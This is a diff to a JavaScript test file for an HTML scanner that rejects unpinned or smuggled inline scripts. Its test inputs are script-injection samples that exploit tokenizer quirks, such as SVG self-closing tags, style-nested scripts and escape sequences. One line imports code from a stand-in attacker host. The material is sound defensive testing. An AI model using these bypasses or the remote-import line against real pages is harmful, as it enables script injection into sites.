@@ -27,6 +27,7 @@ import {
   parseArgs,
   parseAttributes,
   parseBundleTrust,
+  parseStartTag,
   projectKey,
   resolveVite,
   scanDocument,
@@ -224,6 +225,18 @@ test("documents are tokenised conservatively: comments, declarations, contexts, 
   throwsGate(() => scan("<select><option>a</option></select>", { xml: true }), /<select> is refused/);
   throwsGate(() => scan("<script><!--<script>a</script>globalThis.pwned=1--></script>"), /script data escape sequence/);
   assert.equal(scan("<script>if (a<b) go()</script>").scripts[0].body, "if (a<b) go()");
+  // The self-closing flag as the tokenizer sets it: a "/" ending an unquoted value is value data, so
+  // "<svg a=b/>" opens an svg element and the script inside its <style> is found; "<svg/ >" is not
+  // self-closing to a browser either and fails here as unparsable.
+  assert.deepEqual(scan("<svg a=b/><style><script>globalThis.pwned=1</script></style></svg>").scripts.map((s) => s.body), ["globalThis.pwned=1"]);
+  assert.deepEqual(scan("<svg a=/><style><script>globalThis.pwned=1</script></style></svg>").scripts.map((s) => s.body), ["globalThis.pwned=1"]);
+  throwsGate(() => scan("<svg/ ><style><script>globalThis.pwned=1</script></style></svg>"), /cannot parse attributes/);
+  throwsGate(() => scan("<svg a=b/ ><title>t</title></svg>"), /integration point/); // the element is open: a="b/", then ">"
+  assert.equal(scan('<svg a="b"/><svg c/><svg d=e /><style>.a{}</style>').scripts.length, 0); // genuinely self-closing: no svg context
+  assert.equal(scan("<script a=b/>x</script>").scripts[0].body, "x");
+  // An SVG script element has no `language` attribute: it is marked foreign and judged on `type` alone.
+  assert.deepEqual(scan('<svg><script language="vbscript">x</script></svg>').scripts.map((s) => s.foreign), [true]);
+  assert.deepEqual(scan('<script language="vbscript">x</script>').scripts.map((s) => s.foreign), [false]);
   throwsGate(() => scan('<!-- <script src="/a.js"> --><script src="https://cdn.example.invalid/x.js"></script>'), /comment contains markup/);
   throwsGate(() => scan("<!-- a > b -->"), /comment contains markup/);
   throwsGate(() => scan("<!-- never closed"), /unterminated comment/);
@@ -240,6 +253,12 @@ test("documents are tokenised conservatively: comments, declarations, contexts, 
   throwsGate(() => scan('<script src="/a.js" src="/b.js"></script>'), /repeated/);
   throwsGate(() => parseAttributes('a="1" a="2"', "t"), /repeated/);
   assert.deepEqual([...parseAttributes(` async defer src = "x.js" type='module' nomodule`, "t")], [["async", null], ["defer", null], ["src", "x.js"], ["type", "module"], ["nomodule", null]]);
+  // Self-closing only from the attribute-name or after-quoted-value states; a "/" after an unquoted value is data.
+  for (const [raw, selfClosing, attrs] of [["/", true, []], ["a=b/", false, [["a", "b/"]]], ["a=/", false, [["a", "/"]]], ['a="b"/', true, [["a", "b"]]], ["a='b'/", true, [["a", "b"]]], ["a/", true, [["a", null]]], ["a=b /", true, [["a", "b"]]], ["a=b c=/", false, [["a", "b"], ["c", "/"]]], [" a= b/", false, [["a", "b/"]]]]) {
+    const parsed = parseStartTag(raw, "t");
+    assert.deepEqual([parsed.selfClosing, [...parsed.attrs]], [selfClosing, attrs], JSON.stringify(raw));
+  }
+  throwsGate(() => parseStartTag("/ ", "t"), /cannot parse attributes/);
   for (const html of ['<iframe src="/x.html"></iframe>', '<iframe srcdoc="&lt;script&gt;x&lt;/script&gt;"></iframe>', "<object data='x.swf'></object>", "<embed src=x>", "<applet></applet>", '<base href="https://cdn.example.invalid/">', "<base/>", '<link rel="import" href="x.html">']) {
     throwsGate(() => scan(html), /refused/, html);
   }
@@ -310,6 +329,7 @@ test("HTML documents: known sources, pinned inline scripts, inert data blocks, b
     throwsGate(() => judge('<script language="">import("https://attacker.example/matcher.js")</script>'), /inline script 1 is not pinned/);
     throwsGate(() => judge("<script language>import('https://attacker.example/matcher.js')</script>"), /inline script 1 is not pinned/);
     assert.equal(judge('<script language="vbscript">x</script>').data, 1);
+    throwsGate(() => judge('<svg><script language="vbscript">x</script></svg>'), /inline script 1 is not pinned/); // SVG scripts ignore `language`
     assert.equal(judge('<script type="text/template">{"dep":"react"}</script>').data, 1);
     // Tokenizer states and SVG sources.
     throwsGate(() => judge('<noscript><script type="application/json"></noscript><script>globalThis.pwned=1</script>'), /inline script 1 is not pinned/);
@@ -644,6 +664,8 @@ test("the deployment build's output must equal this build's chunks and pins (--v
     await refused(inHtml("<svg><style><script>globalThis.pwned=1</script></style></svg>"), /inline script 2 is not pinned/);
     await refused(inHtml("<select><style><script>globalThis.pwned=1</script></style></select>"), /<select> is refused/);
     await refused(inHtml("<script><!--<script>a</script>globalThis.pwned=1--></script>"), /script data escape sequence/);
+    await refused(inHtml("<svg a=b/><style><script>globalThis.pwned=1</script></style></svg>"), /inline script 2 is not pinned/);
+    await refused(inHtml('<svg><script language="vbscript">globalThis.pwned=1</script></svg>'), /inline script 2 is not pinned/);
     await refused(inHtml('<script language="">import("https://attacker.example/matcher.js")</script>'), /inline script 2 is not pinned/);
     await refused(() => writeFileSync(join(dist, "embed.js"), "/* replaced after the build */\n"), /embed\.js does not match its pin/);
     await refused(inHtml("<script>window.__late = 1</script>"), /inline script 2 is not pinned/);
